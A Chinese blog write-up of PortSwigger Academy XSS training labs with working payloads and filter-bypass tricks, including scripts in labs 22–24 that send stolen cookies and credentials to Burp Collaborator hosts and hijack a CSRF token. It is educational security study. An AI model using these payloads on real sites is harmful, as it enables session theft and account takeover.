# Burp官方xss靶场记录


<!--more-->



> 回炉一下









### 1.[Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

将 XSS反射到HTML 上下文中，不进行任何编码



![image-20250306111028100](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111028100.png)





尝试：

![image-20250306111236066](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111236066.png)

将 XSS 反射到 HTML 上下文中，不进行任何编码 ：

![image-20250306111309444](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111309444.png)

![image-20250306111327336](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111327336.png)



































### 2.[Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)



将 XSS 存储到 HTML 上下文中，未进行任何编码



发表评论，再查看评论：





![image-20250306111539350](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111539350.png)

![image-20250306111612045](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111612045.png)











### 3.[DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

document.write使用源在接收器中进行 DOM XSSlocation.search



本实验包含搜索查询跟踪功能中的一个基于DOM的跨站点脚本漏洞。它使用JavaScript document.write函数，该函数将数据写入页面。使用来自location.search数据调用document.write函数，您可以使用网站URL控制该数据。





1.搜索框中输入内容

2.右键单击并检查该元素，并观察您的随机字符串已放置在img src属性内。

![image-20250306111938285](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306111938285.png)





使用payload闭合前面的img标签的src属性：

```javascript
"><svg onload=alert(1)>
```



![image-20250306112043383](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112043383.png)

















### 4.[DOM XSS in `innerHTML` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

innerHTML使用源在接收器中进行 DOM XSSlocation.search



本实验包含搜索博客功能中的一个基于DOM的跨站点脚本漏洞。它使用innerHTML赋值，该赋值使用location.search中的数据更改div元素的HTML内容。
要解决此实验，请执行调用alert函数的跨站点脚本攻击。







```javascript
<img src=1 onerror=alert(1)>
```

![image-20250306112413118](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306112413118.png)



















### 5.[DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

用源的jQuery 锚点属性接收器中的DOM XSShreflocation.search



本实验在提交反馈页面中包含一个基于DOM的跨站点脚本漏洞。它使用jQuery库的$ selector函数查找锚元素，并使用location.search中的数据更改其href属性。
要解决此实验，请创建“返回”链接警报document. cookie。



操作步骤：

```
在提交反馈页面上，将查询参数更改returnPath为/后跟随机字母数字字符串。
右键单击并检查该元素，并观察您的随机字符串已放置在 ahref属性内。
改成returnPath：

javascript:alert(document.cookie)
按 Enter 键并单击“返回”
```

![image-20250306133303742](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133303742.png)

使用伪协议，输入完payload后，点击返回

![image-20250306133452086](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133452086.png)

![image-20250306133500308](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306133500308.png)













### 6.[DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

jQuery 选择器接收器中使用 hashchange 事件的 DOM XSS

> 当URL的片段标识符更改时，将触发hashchange事件 (跟在＃符号后面的URL部分，包括＃符号)





本实验在主页上包含一个基于DOM的跨站点脚本漏洞。它使用jQuery的$（）选择器函数来自动滚动到给定的帖子，其标题通过location.hash属性传递。
要解决实验室问题，请向受害者发送一个漏洞，在其浏览器中调用print（）函数。



查看源代码：

![image-20250306134522696](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134522696.png)



它的含义是它会在浏览器的hash（URL中#后面的部分）发生变化时被触发。作用是根据URL中的hash值，在页面中查找对应的博客文章标题，并将该标题所在的位置滚动到可视区域内。如果找到匹配的元素（即 post 不为 null），则会调用 scrollIntoView() 方法，将该元素滚动到可视区域内。





查看官方给出的payload，根据浏览器渲染顺序，会优先进行HTML解析，所以iframe的src属性值置为靶场URL，然后进行JS解析，触发onload事件修改src属性值，由原有URL再加上payload。

在服务器修改body值并发送数据包到客户端，可以造成页面hash值变化，触发XSS攻击执行print()函数。

因此onload事件修改了url值，所以会触发hashchange事件

```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```



使用burp，或者靶场提供的工具：

点击 Go to exploit server进行利用服务器，将payload放入body中。点击store进行保存，然后点击veiw exploit查看攻击效果：

![image-20250306135044715](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135044715.png)

![image-20250306134257696](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306134257696.png)









![image-20250306135030865](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135030865.png)





返回漏洞利用服务器并单击 **交付给受害者**`Deliver to victim` 以完成实验问题：





> 看完还是有点晕乎乎的





### 7.[Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

尖括号编码的反射型XSS



本实验包含搜索博客功能中反映的跨站点脚本漏洞，其中尖括号是HTML编码的。要解决此实验，请执行跨站点脚本攻击，注入属性并调用alert函数。





随意搜索一些东西：可以看到搜索值在input的value属性里面

![image-20250306135747808](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135747808.png)





输入一些payload：

可以发现尖括号被编码了，但是`/`和引号没有被编码：

![image-20250306135923606](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306135923606.png)





避免使用尖括号，闭合前面的标签：

![image-20250306140043110](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140043110.png)





![image-20250306141227005](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141227005.png)









### 8.[Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

双引号编码的href属性存储型XSS













在留言板输入内容后，评论会显示留言内容，其中输入的网址会成为a标签herf属性的值，它所对应的是输入的用户名位置。

![image-20250306140504361](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140504361.png)







输入payload：看到双引号被进行html编码了

![image-20250306140653270](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140653270.png)





修改payload为js伪协议：

```
javascript:alert(1)

```

返回到留言板页面，点击用户名，触发XSS弹窗

![image-20250306140913765](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306140913765.png)







































### 9.[Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)



JavaScript字符串中带尖括号编码的反射型XSS





搜索框输入`<script>alert(/xss/)</script>`，发现尖括号被进行了html编码。



![image-20250306141556803](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141556803.png)





不使用尖括号，闭合前后的单引号，并且构造成一个完整js语句，触发XSS弹窗。

```
';alert(/xss/);'

'-alert(1)-'

```



![](../../../../../Library/Application Support/typora-user-images/image-20250306141640436.png)





![image-20250306141702688](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306141702688.png)











### 10.从URL获取参数写到select元素内的DOM型XSS

DOM XSS in document.write sink using source location.search inside a select element



本实验包含股票检查器功能中的一个基于DOM的跨站点脚本漏洞。它使用JavaScript document.write函数，该函数将数据写入页面。document.write函数是用来自location.search的数据调用的，您可以使用网站URL来控制这些数据。数据包含在选择元素中。
要解决此实验，请执行跨站点脚本攻击，该攻击将突破select元素并调用alert函数。





可以看到，js根据URL中的查询参数storeId来生成一个下拉选择框select元素

![image-20250306143024090](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143024090.png)

所以在URL后面加上参数storeId，toreId的值被加入到了拉选择框。

```
&storeId="></select><img%20src=1%20onerror=alert(1)>
```





![image-20250306143122927](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143122927.png)





![image-20250306143203105](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143203105.png)





### 11.AngularJS中尖括号和双引号编码的DOM型XSS

[DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)





ng-appAngularJS 是一个流行的 JavaScript 库，它扫描包含属性（也称为 AngularJS 指令） 的 HTML 节点的内容。当指令添加到 HTML 代码中时，您可以执行双花括号内的 JavaScript 表达式。当对尖括号进行编码时，此技术非常有用。 





在搜索框中输入随机字母数字字符串。 查看页面源代码并观察您的随机字符串是否包含在ng-app指令中。



在搜索框输入`add{{1+1}}`，看到执行了，说明双大括号内是可以执行代码表达式的。

![image-20250306143614793](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143614793.png)



 在搜索框中输入以下 AngularJS 表达式：

```
 {{$on.constructor('alert(1)')()}}
```

![image-20250306143518411](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306143518411.png)











### 12.反射型 DOM XSS

[Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)



查看源代码，eval函数将响应的数据拼接字符串后执行。

![image-20250306150304017](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150304017.png)





可以看到是json格式的：

![image-20250306150415987](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150415987.png)





但是会对双引号转义：

![image-20250306150458379](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150458379.png)









通过尝试不同的搜索字符串，您可以确定JSON响应正在转义引号。但是，反斜杠没有被转义。

没有对`\`进行转移，在双引号前加`\`，可以使双引号转义失效，`\"}`或者**破坏原本json语义，使json数据提前结束。**

```javascript
\"-alert(1)}//
\"};alert(/xss/);//
```



![image-20250306150753275](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150753275.png)



![image-20250306150722269](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150722269.png)





最终eval函数的值会执行alert函数：

值会变成这样：`var searchResultsObj = "results":[],"searchTerm":"\\"-alert(1)//"}`



![image-20250306150831169](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306150831169.png)



### 13.存储型DOM XSS

[Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

在留言板的评论，会过滤`</script>`

![image-20250306222631321](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222631321.png)



js源码中使用replace()将尖括号换成空字符串，但是只对第一个`<`和`>`进行替换。

![image-20250306222723118](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222723118.png)





在xss代码前插入一组<>，即可绕过

```html
<><img src=1 onerror=alert(/xss/)>

```







![image-20250306222800907](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306222800907.png)











### 14.大部分HTML标签和属性被过滤的反射型XSS

[Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)



本题需要绕过WAF，大部分标签和属性被过滤了。



使用burp遍历，爆破哪些标签不会被拦截：

![image-20250306224020461](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224020461.png)



这里使用burp提供的https://portswigger.net/web-security/cross-site-scripting/cheat-sheet，分别使用标签和事件替换到爆破的payload：

![image-20250306223351572](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306223351572.png)



我的网的问题还是怎么回事加载不了了，就借鉴一下别人的吧（https://www.cnblogs.com/smileleooo/p/18069037#612-%E5%8F%8D%E5%B0%84%E5%9E%8B-dom-xss）





**先枚举标签**，发现body和custom tags没有被过滤：

![image-20250306224038293](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224038293.png)

![image-20250306224049012](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224049012.png)





**再枚举属性**：在body标签里面添加变量，复制所有的event到这里

![image-20250306224059435](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224059435.png)

发现这些属性没有被过滤：

![image-20250306224109258](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224109258.png)



利用iframe和onload属性自动触发onresize事件。

在exploit server，将以下playload保存并发送给受害者。这个payload通过iframe的src属性加载网址，然后在页面加载和大小变化时执行print()。

![image-20250306224120897](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224120897.png)



























### 15.除了自定义标签外所有HTML标签都被过滤的反射型XSS

[Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)



> 为自定义标签设置id属性，并像操作其他DOM元素一样，通过JavaScript来访问和操作这些带有id的自定义元素，在url中使用#id可以将页面定位到指定id元素。

```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

```

这段js代码将浏览器的当前位置重定向到指定的URL，serach参数的内容是 `<xss id=x onfocus=alert(document.cookie) tabindex=1>`。

这个 XSS payload中：`<xss id=x`：是一个自定义的标签，用于识别和定位该元素。`onfocus=alert(document.cookie)`：在元素获得焦点时触发弹出一个对话框显示当前cookie信息。`tabindex=1`：设置tabindex属性为1，用户在通过Tab键切换焦点时可能会先将焦点定位到这个自定义元素上。

进入exploit server，将以下playload保存并发送给受害者。















### 16.SVG标签的反射型XSS

[Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)



burp intruder爆破标签和属性发现svg标签、animatetransform标签未被过滤。

![image-20250306224752583](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306224752583.png)



payload：

```html
<svg><animatetransform onbegin=alert(/xss/)>
```



其中`<svg>`标签表示开始一个 SVG 图形容器；`<animateTransform>`元素用于定义 SVG 动画中的变换效果；`onbegin`属性定义了动画开始时要执行的脚本或函数。















### 17.规范链接标签中的反射型XSS

[Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)















### 18.JavaScript字符串中转义了单引号和反斜杠的反射型XSS

[Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)







过滤了单引号和反斜杠，无法闭合searchItem：

![image-20250306225658226](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225658226.png)

输入`</script><script>alert(/xss/)</script>`，第一个`</script>`用作闭合最前面的script标签了。后面被script被正常执行。

![image-20250306225818785](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225818785.png)

![image-20250306225837886](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250306225837886.png)







### 19.JavaScript字符串中转义了单引号并对尖括号和双引号进行html编码的反射XSS

[Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)



可以看到对单引号进行了转义、尖括号和双引号进行了编码：

![image-20250307094127031](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094127031.png)







![image-20250307094041932](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094041932.png)

![image-20250307093958428](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307093958428.png)





输入`\';alert(/xss/);//`，**使用反斜杠来转义‘转义单引号的反斜杠’，这样单引号不会被转义，使得js字符串的单引号闭合**

`;`使语句完整，在alert后注释掉后面的js代码，构成完整语句不报错。



```
\'-alert(1)//
\';alert(/xss/);//
```

![image-20250307094429095](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094429095.png)











### 20.对尖括号和双引号HTML编码及对单引号和反斜杠进行转义的存储型XSS

[Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)



在评论功能处

可以看到单引号和反斜杠被转义：

![image-20250307094825118](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307094825118.png)





想要实现payload的逃逸，就要绕出onclick事件的包裹



使用html实体编码闭合前后的单引号，绕过单引号转义，`&apos;`为单引号的html实体编码。

```html
&apos;-alert(1)-&apos;
```



点击用户名触发：

![image-20250307095134444](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095134444.png)

![image-20250307095247794](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095247794.png)













### 21.对尖括号，单双引号，反斜杠和反引号进行模板文本unicode转义的反射XSS

[Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)





本实验包含搜索博客功能中反映的跨站点脚本漏洞。**反射发生在一个模板字符串**中，该字符串带有尖括号、HTML编码的单引号和双引号以及转义的反引号。要解决此实验，请执行跨站点脚本攻击，在模板字符串中调用alert函数。



在搜索框中测试，发现进行了unicode编码转义：



![image-20250307095533025](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095533025.png)





根据题目提示使用模板字符串

> JavaScript模板字符串使用`反引号`包裹，使用`${}`语法可以插入变量或表达式，这些变量或表达式会被执行并插入到字符串中

可以从上图中看到确实在被反引号包裹的，所以这里使用`${}`进行插入



输入`${1+1}`可以看到被执行

![image-20250307095853826](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095853826.png)

payload:

```
${alert(1)}
```

![image-20250307095912520](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095912520.png)





![image-20250307095923604](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307095923604.png)







### 22.利用XSS来窃取Cookies

[Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)



评论功能中的存储型XSS漏洞。利用该漏洞窃取受害者的会话cookie，然后使用该cookie来冒充受害者。





1.打开Burp Collaborator Client，复制地址





2.在留言板提交下面内容，fetch里面的URL内容是Burp Collaborator Client复制出来的payload。

```js
<script>
fetch('https://nulfyp1987evstcfop4hde17dyjp7fv4.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```



这段js脚本使用fetch函数向Collaborator的url发送了一个POST请求，它将当前页面的cookie作为请求的body发送到了Collaborator。





3.回到Collaborator，看到下方HTTP交互的Request to Collaborator，发现了脚本发送来的请求，其中body值为我们要的cookie。

![image-20250307102433171](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102433171.png)



4.burp拦截包，刷新Home页面，Burp拦截后把其中的session替换为从Collaborator拿到的session。

![image-20250307102700435](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307102700435.png)











### 23.利用XSS来窃取密码

[Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)



和上一题类似



将下面的脚本放到留言板

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://2qtuu4xo4maao88uk40w9txm9df53vrk.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```





这段js脚本包含了两个输入框，一个是用户名的输入框，另一个是密码的输入框。当密码输入框的值发生改变时（onchange事件）会执行js代码。

其中使用了fetch函数发送了一个POST请求到Collaborator。请求的body部分使用了用户名和密码的组合进行拼接，并且使用冒号进行分隔。其中，用户名是通过username.value获取的，而密码是通过this.value获取的（即当前密码输入框的值）。





提交留言后，回到Collaborator，可以看到下方HTTP交互，脚本发送来的请求的内容是我们要的用户名和密码，然后冒充该用户登录。

![image-20250307103102579](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103102579.png)

















### 24.利用XSS执行CSRF

Exploiting XSS to bypass CSRF defenses





目的：执行CSRF攻击，并更改查看博客文章评论的人的电子邮件地址。



进入我的账户页面，查看源码会发现在登录表单中存在一个隐藏的 CSRF token，他会在登录表单提交时被携带。

![image-20250307103520675](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20250307103520675.png)

在留言板提交这段js脚本：

```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

```

这段js首先通过XMLHttpRequest对象发送了一个GET请求到/my-account页面，一旦请求完成，会调用handleResponse函数。

在handleResponse函数中，从响应文本中使用了正则表达式提取了一个名为"csrf"、值为一个单词字符序列的CSRF token。

接着发送一个POST请求到/my-account/change-email页面。在这个请求中，包含了之前获取到的CSRF token以及要修改的邮箱地址test@test.com。





提交后回到留言界面，该脚本就被执行了，邮箱地址被更改为test@test.com。











参考：

https://www.cnblogs.com/smileleooo/p/18069037#615-%E9%99%A4%E4%BA%86%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A0%87%E7%AD%BE%E5%A4%96%E6%89%80%E6%9C%89html%E6%A0%87%E7%AD%BE%E9%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss  很多解题文字由于懒了，直接照搬的，感谢这位师傅

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

https://blog.csdn.net/qq_33168924/article/details/135657809













---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/burp%E5%AE%98%E6%96%B9xss%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/  

